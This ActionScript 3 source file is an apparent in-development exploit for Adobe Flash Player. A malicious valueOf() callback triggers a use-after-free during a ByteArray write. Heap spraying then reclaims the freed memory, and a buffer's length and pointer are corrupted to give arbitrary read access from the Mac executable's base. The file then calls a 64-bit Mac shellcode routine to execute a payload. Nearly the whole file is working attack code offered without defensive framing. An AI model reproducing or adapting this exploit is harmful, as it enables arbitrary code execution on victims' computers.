package
{
	import flash.utils.ByteArray;
	import flash.system.Capabilities;
	import avmplus.*;
	
	public class MyClassShellBA
	{
		static var 
			_gc:Array, 
			_va:Array,
			_ba:ByteArray,
			_isDbg:Boolean = true,
			_alen:uint,
			_overwriteByte:uint,
			_filllen:uint = 0x1000;
	
		static function Hex(n:Number):String
		{
			if (n >= 0 && n <= 9) return n.toString() 
			else return "0x" + n.toString(16);
		}

		static function DoSleep(ms:int):void {
			/*
			var init:int = getTimer();
			while(true) {
				if(getTimer() - init >= ms) {
					break;
				}
			}
			*/
		}
			
		// prints text message into the text area
		static function logAdd(str:String):void
		{
			trace(str);
			//DoSleep(100);
		}
		
		// define malicious valueOf()
		prototype.valueOf = function ()
		{
			logAdd("MyClass.valueOf()");
			
			_va = new Array(_alen);
			//logAddr("_va addr = " + Hex(_va.getAddr()));
			_gc.push(_va); // protect from GC // for RnD

			logAdd("vOf _ba addr = " + Hex(_ba.getAddr()));
			//logAdd("vOf _ba getSizeOfInstance = " + Hex(_ba.getSizeOfInstance()));
			//logAdd("vOf _ba getTotalSize = " + Hex(_ba.getTotalSize()));
			//logAdd("vOf _ba getExtraSize = " + Hex(_ba.getExtraSize()));
			//logAdd("vOf _ba getSlotAreaSize = " + Hex(_ba.getSlotAreaSize()));
			logAdd("vOf _ba buffer addr = " + Hex(_ba.getBufferAddr()));
			logAdd("vOf _ba buffer ptr addr = " + Hex(_ba.getBufferArrayPtrAddr()));
			logAdd("vOf _ba buffer array addr = " + Hex(_ba.getBufferArrayAddr()));
			logAdd("vOf _ba byteArray addr = " + Hex(_ba.getByteArrayAddr()));
			var target = _ba.getBufferAddr();

			// reallocate _ba storage
			_ba.length = 0x11000;
			//_ba.length = 0x21a6a0*2

			//logAdd("vOf _ba 2 getSizeOfInstance = " + Hex(_ba.getSizeOfInstance()));
			//logAdd("vOf _ba 2 getTotalSize = " + Hex(_ba.getTotalSize()));
			//logAdd("vOf _ba 2 getExtraSize = " + Hex(_ba.getExtraSize()));
			//logAdd("vOf _ba 2 getSlotAreaSize = " + Hex(_ba.getSlotAreaSize()));
			logAdd("vOf _ba 2 buffer addr = " + Hex(_ba.getBufferAddr()));
			logAdd("vOf _ba 2 buffer ptr addr = " + Hex(_ba.getBufferArrayPtrAddr()));
			logAdd("vOf _ba 2 buffer array addr = " + Hex(_ba.getBufferArrayAddr()));
			logAdd("vOf _ba 2 byteArray addr = " + Hex(_ba.getByteArrayAddr()));


			// reuse freed memory
			for(var i:int = 0; i < _va.length; i += 1) {
				//_va[i] = new Vector.<uint>(0x3f0);
				//_va[i] = new ByteArray();
				_va[i] = new Modify();
				//_va[i].length = 0x20;
				_va[i].length = 0;
				_va[i].length = _filllen;
				//logAdd("vv = _va[" + i + "]");
				/*for (var j:int = 0; j < _va[i].length; j += 4) {
					_va[i][j] = 0x20;
					//logAdd("vv[" + j + "] before = " + vv[j]);
					//vv[j] = 0x20;
					//logAdd("vv[" + j + "] after = " + vv[j]);
				}*/
				for (var j:int = 0; j < _filllen; j += 4) {
					_va[i][j+0] = 0x00;
					_va[i][j+1] = 0x20;
					_va[i][j+2] = 0x00;
					_va[i][j+3] = 0x00;
					//_va[i].writeUnsignedInt(_filllen*2);
				}
				_gc.push(_va[i]);
				//_va[i].length = 0xf8;
				logAdd("_va[" + i + "] length = " + Hex(_va[i].length));
				logAdd("_va[" + i + "] addr = " + Hex(_va[i].getAddr()));
				logAdd("_va[" + i + "] getSizeOfInstance = " + Hex(_va[i].getSizeOfInstance()));
				logAdd("_va[" + i + "] getTotalSize = " + Hex(_va[i].getTotalSize()));
				logAdd("_va[" + i + "] getExtraSize = " + Hex(_va[i].getExtraSize()));
				logAdd("_va[" + i + "] getSlotAreaSize = " + Hex(_va[i].getSlotAreaSize()));
				logAdd("_va[" + i + "] buffer addr = " + Hex(_va[i].getBufferAddr()));
				logAdd("_va[" + i + "] buffer ptr addr = " + Hex(_va[i].getBufferPtrAddr()));
				logAdd("_va[" + i + "] buffer array ptr addr = " + Hex(_va[i].getBufferArrayPtrAddr()));
				logAdd("_va[" + i + "] buffer array addr = " + Hex(_va[i].getBufferArrayAddr()));
				logAdd("_va[" + i + "] byteArray addr = " + Hex(_va[i].getByteArrayAddr()));
				if (_va[i].getBufferAddr() == target) {
					logAdd("found target");
					System.isDebugger();
				}
				//_va[i].Test();
				//_va[i].length = (0x3f0 + 30)*4;
				//_va[i].length = 0x3f0*4;
			}

			//System.isDebugger();

			//System.isDebugger();
			_overwriteByte = (_va[0].getBufferArrayAddr() & 0xff0000) >> 16;
			logAdd("_overwriteByte: " + Hex(_overwriteByte));

			// return one byte for overwriting
			return _overwriteByte;
		}
		
		// try to corrupt the length value of Vector.<uint>
		static function TryExpl() : Boolean
		{
			logAdd("TryExp1()");
			try
			{
				_alen = 5*3+2+25;
				var alen:int = 3*30; // should be multiply of 3
				var a = new Array(alen);
				if (_gc == null) _gc = new Array();
				_gc.push(a); // protect from GC // for RnD
				
				logAdd("allocing");
				//DoSleep(1000);
				
				// try to allocate two sequential pages of memory: [ ByteArray ][ MyClass2 ]
				for(var i:int = 0; i < alen; i+=3){
					a[i] = new MyClassShellBA2(i);
					logAdd("a[" + i + "] addr = " + Hex(a[i].getAddr()));

					var ai1idx = i+1;
					a[i+1] = new ByteArray();
					logAdd("a[" + ai1idx + "] addr = " + Hex(a[ai1idx].getAddr()));
					logAdd("a[" + ai1idx + "] getSizeOfInstance = " + Hex(a[ai1idx].getSizeOfInstance()));
					logAdd("a[" + ai1idx + "] getTotalSize = " + Hex(a[ai1idx].getTotalSize()));
					logAdd("a[" + ai1idx + "] getExtraSize = " + Hex(a[ai1idx].getExtraSize()));
					logAdd("a[" + ai1idx + "] getSlotAreaSize = " + Hex(a[ai1idx].getSlotAreaSize()));
					//a[i+1].length = (0xfa0+30)*4;
					//a[i+1].length = 0xfa0*4+0x30;
					a[i+1].length = _filllen;
					//logAdd("a[" + ai1idx + "] n getSizeOfInstance = " + Hex(a[ai1idx].getSizeOfInstance()));
					//logAdd("a[" + ai1idx + "] n getTotalSize = " + Hex(a[ai1idx].getTotalSize()));
					//logAdd("a[" + ai1idx + "] n getExtraSize = " + Hex(a[ai1idx].getExtraSize()));
					//logAdd("a[" + ai1idx + "] n getSlotAreaSize = " + Hex(a[ai1idx].getSlotAreaSize()));
					
					var ai2idx = i+2;
					a[i+2] = new MyClassShellBA2(i+2);
					logAdd("a[" + ai2idx + "] addr = " + Hex(a[ai2idx].getAddr()));
					//logAdd("a[" + ai2idx + "] getSizeOfInstance = " + Hex(a[ai2idx].getSizeOfInstance()));
					//logAdd("a[" + ai2idx + "] getTotalSize = " + Hex(a[ai2idx].getTotalSize()));
					//logAdd("a[" + ai2idx + "] getExtraSize = " + Hex(a[ai2idx].getExtraSize()));
					//logAdd("a[" + ai2idx + "] getSlotAreaSize = " + Hex(a[ai2idx].getSlotAreaSize()));
				}
				
				logAdd("finding");
				
				// find these pages
				//var v:Array;
				//var v:Vector.<uint>;
				//var v:ByteArray;
				var v:Modify;
				for(i=alen-_alen; i >= 0; i-=3)
				{
					//var idx = 0xd8+0x40+9;
					var idx = 0xd8+0x40+0x150+2;
					logAdd("i: " + i);
					// take next allocated ByteArray
					_ba = a[i];
					// call valueOf() and cause UaF memory corruption 
					logAdd("new MyClass()");
					_ba[idx] = new MyClassShellBA();
					logAdd("_ba[" + idx + "] = " + _ba[idx]);
					logAdd("_ba[" + idx + "] addr = " + Hex(_ba[idx].getAddr()));
					// _ba[3] should be unchanged 0
					if (_ba[idx] != 0) throw new Error("can't cause UaF");
					
					// check results // find corrupted vector
					for(var j:int=0; j < _va.length; j += 1){
						v = _va[j];
						logAdd("v[" + j + "] addr = " + Hex(v.getAddr()));
						logAdd("v[" + j + "] length = " + Hex(v.length));
						logAdd("v[" + j + "] buf addr = " + Hex(v.getBufferAddr()));
					}
					for(var j:int=0; j < _va.length; j += 1){
						v = _va[j];
						logAdd("v[" + j + "] addr = " + Hex(v.getAddr()));
						logAdd("v[" + j + "].a1 addr = " + Hex(v.a1));
						//logAdd("v[" + j + "] pos = " + Hex(v.position));
						//logAdd("v[" + j + "] len = " + Hex(v.length));
						logAdd("v[" + j + "] buf addr = " + Hex(v.getBufferAddr()));
						logAdd("v[" + j + "] buf ptr addr = " + Hex(v.getBufferPtrAddr()));
						logAdd("v[" + j + "] buf array addr = " + Hex(v.getBufferArrayAddr()));
						//logAdd("v[" + j + "] buf array ptr addr = " + Hex(v.getBufferArrayPtrAddr()));
						logAdd("v[" + j + "] bytearray addr = " + Hex(v.getByteArrayAddr()));
						//logAdd("v.length: " + v.length.toString(16));
						if (v.length == 0x2000) {
							trace("found j: " + j);
							logAdd("v.length = 0x" + v.length.toString(16));
							//System.isDebugger();
							//DoSleep(1000);
							v.length = v.length - 1;
							for (var y:int = 0; y < _va.length; y += 1) {
								var vy = _va[y];
								logAdd("y: " + y + " len: " + Hex(vy.length));
								if (y == j) {
									continue;
								}
								var vc = _va[y];
								for (var x:int = 0; x < vc.length; x += 1) {
									if (vc[x] == 0xFF) {
										var lo:uint = x;
										var co:uint = x-4;
										var ao:uint = x - 4 - 8;
										var ro:uint = x - 4 - 8 - 8;
										vc[lo+0] = 0; vc[lo+1] = 0; vc[lo+2] = 0; vc[lo+3] = 0x40;
										vc[co+0] = 0; vc[co+1] = 0; vc[co+2] = 0; vc[co+3] = 0x40;
										vc[ao+0] = 0; vc[ao+1] = 0; vc[ao+2] = 0; vc[ao+3] = 0;
										vc[ao+4] = 1; vc[ao+5] = 0; vc[ao+6] = 0; vc[ao+7] = 0;
										vc[ro+0] = 0; vc[ro+1] = 0x20; vc[ro+2] = 0; vc[ro+3] = 0;
										logAdd("found ByteArray::Buffer obj at " + Hex(x) + " in _va[" + k + "], pointing array to MachO base and setting size to 0x40000000");
										/*for (var xx:int = ro; xx < ro + 0x20; xx += 1) {
											logAdd("vc[" + xx + "] = " + Hex(vc[xx]));
										}*/
										v.position = 0;
										logAdd("Now reading Maaagic!!! --- " + Hex(v.readUnsignedInt()));

										System.isDebugger();
										return;
									}
								}
							}
							logAdd("no dice");
							System.isDebugger();
							
							// check the [ MyClass2 ] presence after [ ByteArray ]
							var k:int = 0x400 + 70;
							if (v[k] == 0x11223344) {
								logAdd("v[k]: " + v[k]);
								// ok, scroll k to mc.a0
								do k-- while (v[k] == 0x11223344);
								var mc:MyClassShellBA2 = a[v[k]];
								mc.length = 0x123;
								
								logAdd("k = " + (k - 0x400) + ", mc = " + MyUtilsShellBA.ToStringV(v, 0x400, 64));
								
								//check for x64 and proceed to payload execution
								if ((k - 0x400) > 40) {
									logAdd("shelling 1");
									/*
									if (MyUtils.isWin()) {
										if (ShellWin64.Init(v, 0x1000, mc, k-8)) ShellWin64.Exec() else logAdd("Fail.");
									}else
									if (MyUtils.isMac()) {
										if (ShellMac64.Init(v, 0x1000, mc, k-8)) ShellMac64.Exec() else logAdd("Fail.");
									}else
										logAdd("todo: unsupported x64 os");
										*/
									if (ShellMac64ShellBA.Init(v, 0x1000, mc, k-8)) {
										logAdd("execing");
										ShellMac64ShellBA.Exec();
									} else {
										logAdd("Fail.");
									}
								} else {
									logAdd("shelling 2");
									/*
									if (MyUtils.isWin()) {
										if (ShellWin32.Init(v, (v[k-4] & 0xfffff000) - 0x1000 + 8, mc, k-4)) ShellWin32.Exec() else logAdd("Fail.");
									}else
										logAdd("todo: unsupported x86 os");
										*/
								}
								
								logAdd("v.length = 0x" + v.length.toString(16));
								return true;
							}
							
							logAdd("bad MyClass2 allocation.");
							break;
						}
					}
				}
				
				logAdd("bad allocation. try again.");
				System.isDebugger();
			}
			catch (e:Error) 
			{
				logAdd("TryExpl() " + e.toString() + " trace:\n" + e.getStackTrace());
			}
			
			return false;
		}
		
		// init GUI elements
		public function init():void
		{
			trace("inside myclass init()");
			//removeEventListener(Event.ADDED_TO_STAGE, init);
			try
			{
				logAdd("Flash: " + Capabilities.version + (true ? " Debug":"")
						+ " " + Capabilities.cpuArchitecture + (is32() ? "-32" : is64() ? "-64":"") + " " + Capabilities.playerType);
				logAdd("OS: " + Capabilities.os  + (Capabilities.supports64BitProcesses ? " 64-bit":" 32-bit"));
				logAdd("Manu: " + Capabilities.manufacturer);
				logAdd("Player: " + Capabilities.playerType);
				for (i = 0; i < 1; ++i) {
					if (TryExpl()) {
						return;
					}
				}
			}
			catch (e:Error) 
			{
				logAdd("InitGui() " + e.toString());
			}
		}
		
		// checks for x32/x64 platform
		static var _platform:String;
		
		static function is32():Boolean
		{
			return false;
		}
		
		static function is64():Boolean
		{
			return true;
		}
	}

}